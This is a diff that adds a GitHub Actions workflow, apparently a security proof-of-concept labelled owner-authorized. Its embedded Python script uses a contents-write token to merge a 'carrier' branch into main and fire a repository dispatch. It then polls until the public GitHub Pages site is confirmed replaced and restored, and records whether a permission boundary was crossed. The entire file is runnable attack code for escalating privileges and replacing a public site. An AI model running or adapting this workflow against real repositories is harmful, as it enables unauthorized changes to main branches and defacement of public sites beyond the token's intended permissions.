@@ -1,0 +1,195 @@
+name: OAI authorized Pages boundary initiator v23
+
+on:
+  pull_request:
+    branches:
+      - main
+    paths:
+      - oai-v23-pages-trigger.txt
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 35
+    steps:
+      - name: Deny direct Actions dispatch, merge carrier, and invoke Pages proof
+        shell: bash
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          CARRIER_BRANCH: oai-v23-pages-carrier
+          MARKER_BRANCH: oai-v23-pages-marker
+          MARKER_PATH: oai-v23-pages-result.json
+          EVENT_TYPE: oai-v23-pages-exec
+        run: |
+          set -euo pipefail
+          mkdir -p oai-v23-initiator-results
+          python3 - <<'PY' > oai-v23-initiator-results/result.json
+          import base64, json, os, time, urllib.error, urllib.parse, urllib.request
+
+          token = os.environ['GH_TOKEN']
+          repo = os.environ['GITHUB_REPOSITORY']
+          carrier = os.environ['CARRIER_BRANCH']
+          marker_branch = os.environ['MARKER_BRANCH']
+          marker_path = os.environ['MARKER_PATH']
+          event_type = os.environ['EVENT_TYPE']
+          nonce = os.environ.get('GITHUB_RUN_ID', '')
+
+          def request(method, path, body=None):
+              data = None if body is None else json.dumps(body).encode()
+              headers = {
+                  'Accept': 'application/vnd.github+json',
+                  'Authorization': f'Bearer {token}',
+                  'X-GitHub-Api-Version': '2026-03-10',
+                  'User-Agent': 'oai-authorized-v23-pages-initiator',
+              }
+              if data is not None:
+                  headers['Content-Type'] = 'application/json'
+              req = urllib.request.Request(f'https://api.github.com/repos/{repo}{path}', data=data, headers=headers, method=method)
+              try:
+                  with urllib.request.urlopen(req, timeout=60) as response:
+                      raw = response.read()
+                      return response.status, dict(response.headers.items()), raw
+              except urllib.error.HTTPError as error:
+                  return error.code, dict(error.headers.items()), error.read()
+
+          def parsed(method, path, body=None):
+              status, headers, raw = request(method, path, body)
+              try:
+                  value = json.loads(raw) if raw else None
+              except json.JSONDecodeError:
+                  value = raw.decode('utf-8', 'replace')
+              return {
+                  'status': status,
+                  'accepted_permissions': headers.get('x-accepted-github-permissions'),
+                  'request_id': headers.get('x-github-request-id'),
+                  'body': value,
+              }
+
+          result = {
+              'mode': 'contents-write-only-to-public-github-pages-replacement',
+              'repository': repo,
+              'nonce': nonce,
+              'target_pull_request_required': False,
+              'declared_original_token_permissions': {
+                  'contents': 'write',
+                  'actions': 'none',
+                  'pages': 'none',
+                  'id_token': 'none',
+                  'workflows': 'none',
+              },
+          }
+
+          workflow_path = urllib.parse.quote('.github/workflows/pages.yml', safe='')
+          result['direct_pages_workflow_dispatch_control'] = parsed(
+              'POST',
+              f'/actions/workflows/{workflow_path}/dispatches',
+              {'ref': 'main'},
+          )
+
+          result['main_before'] = parsed('GET', '/git/ref/heads/main')
+          result['carrier_before'] = parsed('GET', f'/git/ref/heads/{carrier}')
+          result['merge_branch'] = parsed(
+              'POST',
+              '/merges',
+              {
+                  'base': 'main',
+                  'head': carrier,
+                  'commit_message': 'OAI authorized v23 Pages carrier merge',
+              },
+          )
+          result['main_after_merge'] = parsed('GET', '/git/ref/heads/main')
+          result['main_changed'] = bool(
+              result['main_before']['status'] == 200 and
+              result['main_after_merge']['status'] == 200 and
+              result['main_before']['body']['object']['sha'] != result['main_after_merge']['body']['object']['sha']
+          )
+
+          result['repository_dispatch'] = parsed(
+              'POST',
+              '/dispatches',
+              {
+                  'event_type': event_type,
+                  'client_payload': {
+                      'nonce': nonce,
+                      'purpose': 'owner-authorized-temporary-pages-replacement-v23',
+                  },
+              },
+          )
+
+          encoded_marker = urllib.parse.quote(marker_path, safe='/')
+          marker = None
+          observations = []
+          deadline = time.time() + 1500
+          while time.time() < deadline:
+              response = parsed(
+                  'GET',
+                  f'/contents/{encoded_marker}?ref={urllib.parse.quote(marker_branch)}',
+              )
+              observation = {
+                  'status': response['status'],
+                  'request_id': response.get('request_id'),
+              }
+              if response['status'] == 200 and isinstance(response.get('body'), dict):
+                  observation['sha'] = response['body'].get('sha')
+                  try:
+                      decoded = base64.b64decode(response['body']['content']).decode('utf-8', 'replace')
+                      marker = json.loads(decoded)
+                  except Exception as error:
+                      observation['decode_error'] = repr(error)
+              observations.append(observation)
+              if (
+                  isinstance(marker, dict) and
+                  marker.get('marker') == 'GITHUB_PAGES_PUBLIC_CONTENT_REPLACED_AND_RESTORED' and
+                  marker.get('nonce') == nonce
+              ):
+                  break
+              time.sleep(5)
+
+          result['marker_observations'] = observations
+          result['pages_result'] = marker
+          result['public_content_replaced'] = bool(
+              isinstance(marker, dict) and marker.get('public_content_replaced')
+          )
+          result['public_content_restored'] = bool(
+              isinstance(marker, dict) and marker.get('public_content_restored')
+          )
+          result['permission_boundary_crossed'] = bool(
+              result['direct_pages_workflow_dispatch_control']['status'] == 403 and
+              result['merge_branch']['status'] in (200, 201) and
+              result['repository_dispatch']['status'] in (200, 201, 204) and
+              result['public_content_replaced'] and
+              result['public_content_restored']
+          )
+          print(json.dumps(result, indent=2, sort_keys=True))
+          PY
+
+      - name: Record original token permission metadata
+        if: always()
+        shell: bash
+        run: |
+          set -u
+          {
+            printf 'run_id=%s\n' "$GITHUB_RUN_ID"
+            printf 'event=%s\n' "$GITHUB_EVENT_NAME"
+            printf 'repository=%s\n' "$GITHUB_REPOSITORY"
+            printf 'declared_contents_permission=write\n'
+            printf 'declared_actions_permission=none\n'
+            printf 'declared_pages_permission=none\n'
+            printf 'declared_id_token_permission=none\n'
+            printf 'declared_workflows_permission=none\n'
+            uname -a
+            git version --build-options
+          } > oai-v23-initiator-results/meta.txt
+
+      - name: Upload immutable evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: oai-v23-pages-initiator-${{ github.run_id }}
+          path: oai-v23-initiator-results
+          if-no-files-found: error
+          retention-days: 7
